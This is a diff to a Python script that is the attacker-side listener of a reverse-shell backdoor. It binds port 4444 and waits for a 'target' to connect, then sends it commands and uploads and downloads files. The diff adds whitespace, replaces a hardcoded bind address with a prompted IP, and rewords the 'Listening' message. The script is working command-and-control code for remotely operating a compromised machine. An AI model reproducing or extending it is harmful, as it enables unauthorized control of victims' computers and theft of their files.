@@ -1,10 +1,14 @@
 import os
+
 import socket
 import json
+
 
 def reliable_send(data):
     jsondata = json.dumps(data)
     target.send(jsondata.encode())
+
+
 def reliable_recv():
     data = ''
     while True:
@@ -14,9 +18,11 @@ def reliable_recv():
         except ValueError:
             continue
 
+
 def upload_file(file_name):
     f = open(file_name, 'rb')
     target.send(f.read())
+
 
 def download_file(file_name):
     f = open(file_name, 'wb')
@@ -50,9 +56,12 @@ def target_communication():
             result = reliable_recv()
             print(result)
 
+
+your_ip = input('YOUR IP ADDRESS: ')
+
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.bind(('192.168.1.10', 4444))
-print('[+] Listening...............')
+sock.bind((your_ip, 4444))
+print('[+] Listening for the incoming connections *** ')
 sock.listen(5)
 target, ip = sock.accept()
 print('Target Connected from:  ' + str(ip))
